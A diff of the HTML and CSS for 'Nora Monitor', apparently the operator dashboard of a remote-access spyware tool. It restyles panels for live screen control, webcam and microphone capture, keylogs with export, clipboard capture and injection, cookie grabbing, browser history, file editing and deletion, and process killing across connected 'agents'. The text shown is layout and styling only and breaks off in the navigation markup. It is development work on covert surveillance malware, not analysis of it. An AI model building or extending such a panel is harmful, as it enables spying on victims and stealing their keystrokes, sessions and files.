@@ -5,999 +5,639 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Nora Monitor</title>
 <style>
-/* ── Reset & tokens ─────────────────────────────────────── */
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-:root {
-  --sidebar-w: 220px;
-  --hdr-h: 56px;
-  --bg: #0e1117;
-  --surface: #161b27;
-  --surface2: #1e2538;
-  --border: #252d3d;
-  --accent: #4f8ef7;
-  --accent-glow: rgba(79,142,247,.18);
-  --green: #2dd4a0;
-  --red: #f5585a;
-  --yellow: #f5c842;
-  --purple: #a78bfa;
-  --text: #e2e8f4;
-  --muted: #64748b;
-  --muted2: #8897b0;
-  --radius: 10px;
-  --shadow: 0 2px 12px rgba(0,0,0,.5);
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --sidebar:240px;--hdr:52px;
+  --bg:#09090b;--surface:#111318;--surface2:#1a1d27;--surface3:#232836;
+  --border:rgba(255,255,255,.07);--border2:rgba(255,255,255,.12);
+  --accent:#6366f1;--accent2:#818cf8;--accent-dim:rgba(99,102,241,.12);
+  --green:#22c55e;--red:#ef4444;--yellow:#eab308;--purple:#a78bfa;--cyan:#22d3ee;
+  --text:#f4f4f5;--text2:#a1a1aa;--text3:#71717a;
+  --radius:10px;--shadow:0 4px 24px rgba(0,0,0,.6);
 }
-html, body { height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; font-size: 14px; }
+html,body{height:100%;font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}
+body{background:var(--bg);color:var(--text);display:flex;flex-direction:column;overflow:hidden}
 
-/* ── Top bar ────────────────────────────────────────────── */
-#topbar {
-  height: var(--hdr-h);
-  background: var(--surface);
-  border-bottom: 1px solid var(--border);
-  display: flex; align-items: center; gap: 12px;
-  padding: 0 20px;
-  flex-shrink: 0;
-  z-index: 100;
+/* ── Top bar ─────────────────────────────────────────────── */
+#topbar{
+  height:var(--hdr);background:var(--surface);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:14px;padding:0 16px;flex-shrink:0;z-index:100;
 }
-#topbar .logo { font-weight: 800; font-size: 1.1rem; letter-spacing: -.03em; color: var(--accent); }
-#topbar .logo span { color: var(--text); opacity: .5; }
-#status-pill {
-  display: flex; align-items: center; gap: 6px;
-  background: var(--surface2); border: 1px solid var(--border);
-  border-radius: 999px; padding: 4px 12px;
-  font-size: .78rem; color: var(--muted2);
-}
-#status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--muted); transition: background .3s; }
-#status-dot.live { background: var(--green); box-shadow: 0 0 6px var(--green); }
-#agent-select {
-  margin-left: auto;
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px;
-  padding: 6px 10px; font-size: .82rem; cursor: pointer; outline: none;
-}
-#fps-badge {
-  font-size: .72rem; color: var(--muted); background: var(--surface2);
-  border: 1px solid var(--border); border-radius: 6px; padding: 3px 8px;
-}
+.logo{font-weight:800;font-size:1.05rem;background:linear-gradient(135deg,var(--accent),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.logo sub{font-size:.6rem;font-weight:500;opacity:.5;-webkit-text-fill-color:var(--text3);vertical-align:bottom}
+#conn-pill{display:flex;align-items:center;gap:6px;font-size:.72rem;color:var(--text3);background:var(--surface2);border:1px solid var(--border);border-radius:99px;padding:3px 10px}
+#conn-dot{width:6px;height:6px;border-radius:50%;background:var(--text3);transition:.3s}
+#conn-dot.live{background:var(--green);box-shadow:0 0 8px var(--green)}
+#agent-sel{margin-left:auto;background:var(--surface2);border:1px solid var(--border2);color:var(--text);border-radius:8px;padding:5px 10px;font-size:.78rem;cursor:pointer;outline:none}
+#fps-pill{font-size:.68rem;color:var(--text3);background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:2px 8px}
 
-/* ── Layout ─────────────────────────────────────────────── */
-#shell { display: flex; flex: 1; overflow: hidden; }
+/* ── Layout ──────────────────────────────────────────────── */
+#shell{display:flex;flex:1;overflow:hidden}
 
-/* ── Sidebar ────────────────────────────────────────────── */
-#sidebar {
-  width: var(--sidebar-w); flex-shrink: 0;
-  background: var(--surface);
-  border-right: 1px solid var(--border);
-  display: flex; flex-direction: column;
-  overflow-y: auto;
+/* ── Sidebar ─────────────────────────────────────────────── */
+#sidebar{
+  width:var(--sidebar);flex-shrink:0;background:var(--surface);
+  border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;padding:8px 6px;
 }
-.nav-section { padding: 16px 10px 4px; }
-.nav-label { font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); padding: 0 8px 6px; }
-.nav-btn {
-  display: flex; align-items: center; gap: 9px;
-  width: 100%; padding: 9px 12px;
-  background: none; border: none; border-radius: 8px;
-  color: var(--muted2); font-size: .85rem; cursor: pointer;
-  text-align: left; transition: background .15s, color .15s;
+.nav-grp{margin-bottom:4px}
+.nav-lbl{font-size:.6rem;text-transform:uppercase;letter-spacing:.12em;color:var(--text3);padding:10px 10px 4px}
+.nav-btn{
+  display:flex;align-items:center;gap:10px;width:100%;padding:8px 12px;
+  background:none;border:none;border-radius:8px;color:var(--text2);font-size:.82rem;
+  cursor:pointer;text-align:left;transition:.15s;position:relative;
 }
-.nav-btn:hover { background: var(--surface2); color: var(--text); }
-.nav-btn.active { background: var(--accent-glow); color: var(--accent); font-weight: 600; }
-.nav-btn .icon { font-size: 1rem; width: 20px; text-align: center; }
+.nav-btn:hover{background:var(--surface2);color:var(--text)}
+.nav-btn.active{background:var(--accent-dim);color:var(--accent2);font-weight:600}
+.nav-btn .ico{width:20px;text-align:center;font-size:.95rem;flex-shrink:0}
 
-/* ── Main content ───────────────────────────────────────── */
-#main { flex: 1; overflow: hidden; display: flex; flex-direction: column; }
+/* ── Main ────────────────────────────────────────────────── */
+#main{flex:1;overflow:hidden;display:flex;flex-direction:column}
+.panel{display:none;flex:1;overflow:hidden;flex-direction:column}
+.panel.on{display:flex}
+.ph{padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-shrink:0}
+.ph h2{font-size:.92rem;font-weight:700}
+.ph .meta{font-size:.72rem;color:var(--text3);margin-left:auto}
+.ph .act-btn{background:var(--surface2);border:1px solid var(--border2);color:var(--text);border-radius:7px;padding:5px 12px;font-size:.78rem;cursor:pointer;transition:.15s}
+.ph .act-btn:hover{border-color:var(--accent);color:var(--accent)}
+.ph .act-btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.ph .act-btn.primary:hover{opacity:.85}
+.ph .act-btn.danger:hover{border-color:var(--red);color:var(--red)}
+.pbody{flex:1;overflow-y:auto;padding:16px 20px}
 
-/* ── Panels ─────────────────────────────────────────────── */
-.panel { display: none; flex: 1; overflow: hidden; flex-direction: column; }
-.panel.active { display: flex; }
-.panel-header {
-  padding: 16px 20px 12px;
-  border-bottom: 1px solid var(--border);
-  flex-shrink: 0;
-  display: flex; align-items: center; gap: 10px;
-}
-.panel-header h2 { font-size: .95rem; font-weight: 700; }
-.panel-header .ph-meta { font-size: .75rem; color: var(--muted); margin-left: auto; }
-.panel-body { flex: 1; overflow-y: auto; padding: 16px 20px; }
+/* ── Screen ──────────────────────────────────────────────── */
+#scr-wrap{flex:1;overflow:hidden;display:flex;align-items:center;justify-content:center;background:#000;position:relative}
+#scr-canvas{max-width:100%;max-height:100%;display:block;cursor:crosshair}
+#scr-overlay{position:absolute;top:8px;right:8px;display:flex;gap:6px}
+.scr-btn{background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.15);color:#fff;border-radius:6px;padding:4px 10px;font-size:.72rem;cursor:pointer}
+.scr-btn:hover{background:rgba(255,255,255,.12)}
+#desk-ctrl{background:var(--surface);border-top:1px solid var(--border);padding:6px 14px;display:flex;gap:6px;flex-shrink:0;flex-wrap:wrap}
+.dc-btn{background:var(--surface2);border:1px solid var(--border);color:var(--text2);border-radius:6px;padding:4px 10px;font-size:.74rem;cursor:pointer}
+.dc-btn:hover{border-color:var(--accent);color:var(--accent)}
+#kb-bar{background:var(--surface);border-top:1px solid var(--border);padding:8px 14px;display:flex;gap:8px;flex-shrink:0}
+#kb-in{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none}
+#kb-in:focus{border-color:var(--accent)}
+#kb-send{background:var(--accent);border:none;color:#fff;border-radius:8px;padding:7px 14px;font-size:.8rem;cursor:pointer;font-weight:600}
 
-/* ── Screen panel ───────────────────────────────────────── */
-#screen-wrap {
-  flex: 1; overflow: hidden;
-  display: flex; align-items: center; justify-content: center;
-  background: #000; position: relative;
-}
-#screen-canvas {
-  max-width: 100%; max-height: 100%;
-  display: block; cursor: crosshair;
-  image-rendering: auto;
-}
-#screen-overlay {
-  position: absolute; top: 8px; right: 8px;
-  display: flex; gap: 6px;
-}
-.screen-btn {
-  background: rgba(0,0,0,.6); border: 1px solid rgba(255,255,255,.15);
-  color: #fff; border-radius: 6px; padding: 5px 10px;
-  font-size: .75rem; cursor: pointer;
-}
-.screen-btn:hover { background: rgba(255,255,255,.12); }
-#remote-kb {
-  background: var(--surface); border-top: 1px solid var(--border);
-  padding: 10px 16px; display: flex; gap: 8px; flex-shrink: 0;
-}
-#remote-kb input {
-  flex: 1; background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 8px 12px; font-size: .85rem;
-  outline: none;
-}
-#remote-kb input:focus { border-color: var(--accent); }
-#remote-kb button {
-  background: var(--accent); border: none; color: #fff;
-  border-radius: 8px; padding: 8px 14px; font-size: .82rem; cursor: pointer;
-  font-weight: 600;
-}
-#desktop-ctrl {
-  background: var(--surface); border-top: 1px solid var(--border);
-  padding: 8px 16px; display: flex; gap: 6px; flex-shrink: 0; flex-wrap: wrap;
-}
-.ctrl-btn {
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 7px; padding: 5px 12px;
-  font-size: .78rem; cursor: pointer;
-}
-.ctrl-btn:hover { border-color: var(--accent); color: var(--accent); }
+/* ── Camera ──────────────────────────────────────────────── */
+#cam-wrap{flex:1;display:flex;align-items:center;justify-content:center;background:#000}
+#cam-img{max-width:100%;max-height:100%;object-fit:contain}
+.tog{background:var(--surface2);border:1px solid var(--border2);color:var(--text);border-radius:8px;padding:6px 14px;font-size:.8rem;cursor:pointer;font-weight:600;transition:.15s}
+.tog.on{background:var(--accent-dim);border-color:var(--accent);color:var(--accent2)}
 
-/* ── Keylog panel ───────────────────────────────────────── */
-#kl-toolbar {
-  padding: 10px 20px;
-  display: flex; gap: 8px; align-items: center;
-  border-bottom: 1px solid var(--border);
-  flex-shrink: 0;
-}
-#kl-toolbar button {
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 7px;
-  padding: 6px 14px; font-size: .8rem; cursor: pointer;
-}
-#kl-toolbar button:hover { border-color: var(--accent); color: var(--accent); }
-#kl-toolbar button.danger:hover { border-color: var(--red); color: var(--red); }
-#kl-export-link {
-  margin-left: auto;
-  background: var(--accent); color: #fff; border: none;
-  border-radius: 7px; padding: 6px 14px; font-size: .8rem;
-  cursor: pointer; font-weight: 600; text-decoration: none;
-  display: flex; align-items: center; gap: 5px;
-}
-#kl-export-link:hover { opacity: .85; }
-#kl-feed { flex: 1; overflow-y: auto; padding: 12px 20px; font-family: "SF Mono","Fira Code",monospace; font-size: .82rem; }
-.kl-app-block { margin-bottom: 4px; }
-.kl-app-hdr {
-  display: flex; align-items: center; gap: 8px;
-  padding: 6px 10px 4px;
-  color: var(--accent); font-size: .75rem; font-weight: 700;
-  border-left: 3px solid var(--accent);
-  margin-bottom: 2px;
-}
-.kl-app-hdr .app-time { color: var(--muted); font-weight: 400; margin-left: auto; font-size: .7rem; }
-.kl-line { padding: 2px 10px 2px 13px; color: var(--text); line-height: 1.7; word-break: break-all; }
-.kl-bs { color: var(--red); }
-.kl-sp { color: var(--purple); }
-.kl-ts { color: var(--muted); font-size: .7rem; margin-right: 6px; }
+/* ── Mic ─────────────────────────────────────────────────── */
+#mic-panel .pbody{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px}
+#mic-orb{width:110px;height:110px;border-radius:50%;border:3px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:2.4rem;background:var(--surface2);transition:.3s}
+#mic-orb.on{border-color:var(--red);box-shadow:0 0 30px rgba(239,68,68,.35)}
+#mic-lbl{color:var(--text3);font-size:.85rem}
 
-/* ── Camera panel ───────────────────────────────────────── */
-#cam-wrap {
-  flex: 1; display: flex; align-items: center; justify-content: center;
-  background: #000;
-}
-#cam-img { max-width: 100%; max-height: 100%; object-fit: contain; }
-#cam-ctrl {
-  background: var(--surface); border-top: 1px solid var(--border);
-  padding: 10px 16px; display: flex; gap: 8px; flex-shrink: 0;
-}
-.toggle-btn {
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 7px 16px;
-  font-size: .82rem; cursor: pointer; font-weight: 600;
-}
-.toggle-btn.on { background: var(--accent-glow); border-color: var(--accent); color: var(--accent); }
+/* ── Clipboard ───────────────────────────────────────────── */
+#clip-inject{display:flex;gap:8px;padding:10px 20px;border-bottom:1px solid var(--border);flex-shrink:0}
+#clip-inject input{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none}
+#clip-inject input:focus{border-color:var(--accent)}
+#clip-inject button{background:var(--accent);border:none;color:#fff;border-radius:8px;padding:7px 14px;font-size:.8rem;cursor:pointer;font-weight:600}
+#clip-feed{flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:6px;padding:12px 20px}
+.clip-card{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-size:.82rem;word-break:break-all}
+.clip-card .ts{color:var(--text3);font-size:.68rem;margin-top:4px}
 
-/* ── Microphone ─────────────────────────────────────────── */
-#mic-panel .panel-body { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
-#mic-vis {
-  width: 120px; height: 120px; border-radius: 50%;
-  border: 3px solid var(--border);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 2.5rem;
-  background: var(--surface2);
-  transition: border-color .3s, box-shadow .3s;
-}
-#mic-vis.active { border-color: var(--red); box-shadow: 0 0 24px rgba(245,88,90,.3); }
-#mic-label { color: var(--muted); font-size: .9rem; }
+/* ── Keylogs ─────────────────────────────────────────────── */
+#kl-bar{padding:8px 20px;display:flex;gap:8px;align-items:center;border-bottom:1px solid var(--border);flex-shrink:0}
+#kl-export{margin-left:auto;text-decoration:none}
+#kl-feed{flex:1;overflow-y:auto;padding:10px 20px;font-family:"JetBrains Mono","Fira Code",monospace;font-size:.8rem}
+.kl-block{margin-bottom:3px}
+.kl-hdr{display:flex;align-items:center;gap:8px;padding:5px 10px 3px;color:var(--accent2);font-size:.72rem;font-weight:700;border-left:3px solid var(--accent);margin-bottom:2px}
+.kl-hdr .t{color:var(--text3);font-weight:400;margin-left:auto;font-size:.68rem}
+.kl-ln{padding:2px 10px 2px 14px;color:var(--text);line-height:1.7;word-break:break-all}
+.kl-bs{color:var(--red)}.kl-sp{color:var(--purple)}.kl-ts{color:var(--text3);font-size:.68rem;margin-right:6px}
 
-/* ── Processes ──────────────────────────────────────────── */
-#proc-toolbar {
-  padding: 10px 20px; border-bottom: 1px solid var(--border);
-  display: flex; gap: 8px; flex-shrink: 0;
-}
-#proc-search {
-  flex: 1; background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 7px 12px; font-size: .82rem; outline: none;
-}
-#proc-search:focus { border-color: var(--accent); }
-#proc-refresh {
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 7px 12px;
-  font-size: .82rem; cursor: pointer;
-}
-#proc-list { flex: 1; overflow-y: auto; }
-.proc-row {
-  display: flex; align-items: center; gap: 10px;
-  padding: 8px 20px; border-bottom: 1px solid var(--border);
-  transition: background .12s;
-}
-.proc-row:hover { background: var(--surface2); }
-.proc-name { flex: 1; font-size: .83rem; font-weight: 500; }
-.proc-pid { color: var(--muted); font-size: .75rem; width: 50px; text-align: right; }
-.proc-cpu { color: var(--muted2); font-size: .75rem; width: 56px; text-align: right; }
-.proc-mem { color: var(--muted2); font-size: .75rem; width: 64px; text-align: right; }
-.proc-kill {
-  background: none; border: 1px solid var(--border);
-  color: var(--red); border-radius: 6px; padding: 3px 9px;
-  font-size: .72rem; cursor: pointer;
-}
-.proc-kill:hover { background: rgba(245,88,90,.12); }
+/* ── Cookies ─────────────────────────────────────────────── */
+.big-btn{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:10px;padding:14px 18px;font-size:.88rem;cursor:pointer;text-align:left;transition:.15s;display:flex;align-items:center;gap:12px;width:100%}
+.big-btn:hover{border-color:var(--accent)}
+.big-btn .bi{font-size:1.4rem}.big-btn strong{display:block;font-weight:700}.big-btn .sub{color:var(--text3);font-size:.75rem}
+#cookie-status{padding:10px 14px;background:var(--surface2);border-radius:8px;font-size:.8rem;color:var(--text2);min-height:36px}
 
-/* ── File Manager ───────────────────────────────────────── */
-#fm-path-bar {
-  padding: 10px 20px; border-bottom: 1px solid var(--border);
-  display: flex; gap: 8px; flex-shrink: 0;
-}
-#fm-path {
-  flex: 1; background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 7px 12px; font-size: .82rem;
-  outline: none; font-family: monospace;
-}
-#fm-path:focus { border-color: var(--accent); }
-#fm-go {
-  background: var(--accent); border: none; color: #fff;
-  border-radius: 8px; padding: 7px 14px; font-size: .82rem; cursor: pointer;
-}
-#fm-list { flex: 1; overflow-y: auto; }
-.fm-row {
-  display: flex; align-items: center; gap: 10px;
-  padding: 8px 20px; border-bottom: 1px solid var(--border);
-  cursor: pointer; transition: background .12s;
-}
-.fm-row:hover { background: var(--surface2); }
-.fm-icon { width: 20px; text-align: center; font-size: 1rem; }
-.fm-name { flex: 1; font-size: .83rem; }
-.fm-size { color: var(--muted); font-size: .75rem; }
-.fm-del {
-  background: none; border: 1px solid var(--border);
-  color: var(--red); border-radius: 6px; padding: 3px 9px;
-  font-size: .72rem; cursor: pointer;
-}
-.fm-del:hover { background: rgba(245,88,90,.12); }
-#fm-editor {
-  background: var(--surface); border-top: 1px solid var(--border);
-  padding: 12px 20px; flex-shrink: 0; display: none; flex-direction: column; gap: 8px;
-}
-#fm-editor.show { display: flex; }
-#fm-editor-path { font-size: .75rem; color: var(--muted); font-family: monospace; }
-#fm-textarea {
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 8px; padding: 10px 12px;
-  font-family: monospace; font-size: .82rem;
-  resize: vertical; min-height: 140px; outline: none;
-}
-#fm-textarea:focus { border-color: var(--accent); }
-#fm-save, #fm-download {
-  background: var(--accent); border: none; color: #fff;
-  border-radius: 8px; padding: 7px 16px; font-size: .82rem; cursor: pointer;
-}
-#fm-download { background: var(--surface2); border: 1px solid var(--border); color: var(--text); }
+/* ── Files ───────────────────────────────────────────────── */
+#fm-pathbar{padding:8px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-shrink:0}
+#fm-path{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none;font-family:monospace}
+#fm-path:focus{border-color:var(--accent)}
+#fm-go{background:var(--accent);border:none;color:#fff;border-radius:8px;padding:7px 14px;font-size:.8rem;cursor:pointer}
+#fm-list{flex:1;overflow-y:auto}
+.fm-r{display:flex;align-items:center;gap:10px;padding:7px 20px;border-bottom:1px solid var(--border);cursor:pointer;transition:.12s}
+.fm-r:hover{background:var(--surface2)}
+.fm-r .ic{width:20px;text-align:center;font-size:.95rem}
+.fm-r .nm{flex:1;font-size:.82rem}
+.fm-r .sz{color:var(--text3);font-size:.72rem}
+.fm-r .del{background:none;border:1px solid var(--border);color:var(--red);border-radius:6px;padding:2px 8px;font-size:.7rem;cursor:pointer}
+.fm-r .del:hover{background:rgba(239,68,68,.1)}
+#fm-edit{background:var(--surface);border-top:1px solid var(--border);padding:12px 20px;flex-shrink:0;display:none;flex-direction:column;gap:8px}
+#fm-edit.show{display:flex}
+#fm-editpath{font-size:.72rem;color:var(--text3);font-family:monospace}
+#fm-ta{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:10px 12px;font-family:monospace;font-size:.82rem;resize:vertical;min-height:130px;outline:none}
+#fm-ta:focus{border-color:var(--accent)}
 
-/* ── Cookies ────────────────────────────────────────────── */
-#cookie-panel .panel-body { display: flex; flex-direction: column; gap: 12px; }
-.big-btn {
-  background: var(--surface2); border: 1px solid var(--border);
-  color: var(--text); border-radius: 10px;
-  padding: 14px 20px; font-size: .9rem; cursor: pointer;
-  text-align: left; transition: border-color .15s;
-  display: flex; align-items: center; gap: 12px;
-  width: 100%;
-}
-.big-btn:hover { border-color: var(--accent); }
-.big-btn .bicon { font-size: 1.4rem; }
-.big-btn .binfo strong { display: block; font-weight: 700; }
-.big-btn .binfo span { color: var(--muted); font-size: .78rem; }
-#cookie-status { padding: 10px 14px; background: var(--surface2); border-radius: 8px; font-size: .82rem; color: var(--muted2); min-height: 40px; }
+/* ── Processes ───────────────────────────────────────────── */
+#proc-bar{padding:8px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-shrink:0}
+#proc-q{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none}
+#proc-q:focus{border-color:var(--accent)}
+#proc-list{flex:1;overflow-y:auto}
+.pr{display:flex;align-items:center;gap:10px;padding:7px 20px;border-bottom:1px solid var(--border);transition:.12s}
+.pr:hover{background:var(--surface2)}
+.pr .pn{flex:1;font-size:.82rem;font-weight:500}
+.pr .pp{color:var(--text3);font-size:.72rem;width:50px;text-align:right}
+.pr .pc{color:var(--text2);font-size:.72rem;width:52px;text-align:right}
+.pr .pm{color:var(--text2);font-size:.72rem;width:60px;text-align:right}
+.pr .pk{background:none;border:1px solid var(--border);color:var(--red);border-radius:6px;padding:2px 8px;font-size:.7rem;cursor:pointer}
+.pr .pk:hover{background:rgba(239,68,68,.1)}
 
-/* ── Recording ──────────────────────────────────────────── */
-#rec-panel .panel-body { display: flex; flex-direction: column; align-items: center; gap: 16px; }
-#rec-indicator {
-  width: 80px; height: 80px; border-radius: 50%;
-  background: var(--surface2); border: 3px solid var(--border);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 2rem; transition: border-color .3s, box-shadow .3s;
-}
-#rec-indicator.recording { border-color: var(--red); box-shadow: 0 0 20px rgba(245,88,90,.4); animation: pulse 1s ease-in-out infinite; }
-@keyframes pulse { 0%,100%{box-shadow:0 0 16px rgba(245,88,90,.35)} 50%{box-shadow:0 0 32px rgba(245,88,90,.6)} }
-#rec-label { color: var(--muted); }
-#rec-btn {
-  background: var(--accent); border: none; color: #fff;
-  border-radius: 10px; padding: 10px 28px; font-size: .9rem; cursor: pointer; font-weight: 700;
-}
-#rec-btn.stop { background: var(--red); }
+/* ── Recording ───────────────────────────────────────────── */
+#rec-panel .pbody{display:flex;flex-direction:column;align-items:center;gap:16px;justify-content:center}
+#rec-orb{width:80px;height:80px;border-radius:50%;background:var(--surface2);border:3px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:2rem;transition:.3s}
+#rec-orb.on{border-color:var(--red);box-shadow:0 0 24px rgba(239,68,68,.4);animation:pulse 1s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 16px rgba(239,68,68,.35)}50%{box-shadow:0 0 36px rgba(239,68,68,.65)}}
+#rec-lbl{color:var(--text3)}
 
-/* ── Clipboard ──────────────────────────────────────────── */
-#clip-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; padding: 16px 20px; }
-.clip-item {
-  background: var(--surface2); border: 1px solid var(--border);
-  border-radius: 8px; padding: 10px 14px;
-  font-size: .82rem; word-break: break-all;
+/* ── System Info ─────────────────────────────────────────── */
+.si-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px}
+.si-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px}
+.si-card .label{font-size:.68rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text3);margin-bottom:4px}
+.si-card .val{font-size:1.05rem;font-weight:700}
+.si-card .sub{font-size:.75rem;color:var(--text2);margin-top:2px}
+.si-bar{height:6px;background:var(--surface3);border-radius:99px;margin-top:8px;overflow:hidden}
+.si-bar-fill{height:100%;border-radius:99px;transition:width .5s}
+.disk-row{display:flex;justify-content:space-between;font-size:.78rem;color:var(--text2);margin-top:6px}
+.disk-row:first-child{margin-top:0}
+
+/* ── Browser History ─────────────────────────────────────── */
+#hist-bar{padding:8px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-shrink:0}
+#hist-q{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:7px 12px;font-size:.82rem;outline:none}
+#hist-q:focus{border-color:var(--accent)}
+#hist-list{flex:1;overflow-y:auto}
+.hi{display:flex;align-items:center;gap:10px;padding:8px 20px;border-bottom:1px solid var(--border);transition:.12s;cursor:default}
+.hi:hover{background:var(--surface2)}
+.hi .br{font-size:.68rem;font-weight:700;color:var(--accent2);background:var(--accent-dim);padding:2px 6px;border-radius:4px;flex-shrink:0;min-width:48px;text-align:center}
+.hi .info{flex:1;min-width:0}
+.hi .ttl{font-size:.82rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hi .url{font-size:.7rem;color:var(--text3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hi .dt{font-size:.68rem;color:var(--text3);flex-shrink:0;text-align:right;min-width:70px}
+.hi .vc{font-size:.68rem;color:var(--text3);flex-shrink:0;width:32px;text-align:right}
+
+/* ── Screenshot ──────────────────────────────────────────── */
+#ss-panel .pbody{display:flex;flex-direction:column;align-items:center;gap:16px;justify-content:center}
+#ss-preview{max-width:100%;max-height:70vh;border-radius:var(--radius);border:1px solid var(--border);display:none}
+#ss-status{color:var(--text3);font-size:.85rem}
+
+/* ── Toast ───────────────────────────────────────────────── */
+#toasts{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column-reverse;gap:6px;z-index:9999}
+.toast{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:.78rem;color:var(--text);box-shadow:var(--shadow);max-width:300px;animation:slideIn .2s ease}
+@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:none}}
+.toast.ok{border-color:var(--green)}.toast.err{border-color:var(--red)}
+
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}
+
+/* ── Responsive ──────────────────────────────────────────── */
+@media(max-width:768px){
+  :root{--sidebar:56px}
+  .nav-btn span:not(.ico){display:none}
+  .nav-lbl{display:none}
+  .logo sub{display:none}
+  .si-grid{grid-template-columns:1fr}
 }
-.clip-ts { color: var(--muted); font-size: .7rem; margin-top: 4px; }
-
-/* ── Toast ──────────────────────────────────────────────── */
-#toast-wrap { position: fixed; bottom: 20px; right: 20px; display: flex; flex-direction: column-reverse; gap: 8px; z-index: 9999; }
-.toast {
-  background: var(--surface2); border: 1px solid var(--border);
-  border-radius: 8px; padding: 10px 16px;
-  font-size: .8rem; color: var(--text);
-  box-shadow: var(--shadow); max-width: 320px;
-  animation: slideIn .2s ease;
-}
-@keyframes slideIn { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:none} }
-.toast.success { border-color: var(--green); }
-.toast.error   { border-color: var(--red); }
-
-/* ── Scrollbars ─────────────────────────────────────────── */
-::-webkit-scrollbar { width: 5px; height: 5px; }
-::-webkit-scrollbar-track { background: transparent; }
-::-webkit-scrollbar-thumb { background: var(--border); border-radius: 999px; }
-
-/* ── Responsive ─────────────────────────────────────────── */
-@media (max-width: 700px) {
-  :root { --sidebar-w: 52px; }
-  .nav-btn span:not(.icon) { display: none; }
-  .nav-label { display: none; }
-  #topbar .logo span { display: none; }
+@media(max-width:480px){
+  :root{--sidebar:0px}
+  #sidebar{display:none}
 }
 </style>
 </head>
 <body>
 
-<!-- TOP BAR -->
 <div id="topbar">
-  <div class="logo">Nora<span>Monitor</span></div>
-  <div id="status-pill">
-    <div id="status-dot"></div>
-    <span id="status-text">Connecting…</span>
-  </div>
-  <select id="agent-select"><option value="">— select agent —</option></select>
-  <div id="fps-badge">— fps</div>
+  <div class="logo">Nora<sub>MONITOR</sub></div>
+  <div id="conn-pill"><div id="conn-dot"></div><span id="conn-txt">Connecting</span></div>
+  <select id="agent-sel"><option value="">Select agent</option></select>
+  <div id="fps-pill">-- fps</div>
 </div>
 
-<!-- SHELL -->
 <div id="shell">
+<nav id="sidebar">
+  <div class="nav-grp">
+    <div class="nav-lbl">Monitor</div>
+    <button class="nav-btn active" data-p="scr"><span class="ico">&#x1F5B5;</span><span>Screen</span></button>
+    <button class="nav-btn" data-p="cam"><span class="ico">&#x1F4F7;</span><span>Camera</span></button>
+    <button class="nav-btn" data-p="mic"><span class="ico">&#x1F399;</span><span>Microphone</span></button>
+    <button class="nav-btn" data-p="clip"><span class="ico">&#x1F4CB;</span><span>Clipboard</span></button>
+  </div>
+  <div class="nav-grp">
+    <div class="nav-lbl">Data</div>
+    <button class="nav-btn" data-p="kl"><span class="ico">&#x2328;</span><span>Keylogs</span></button>
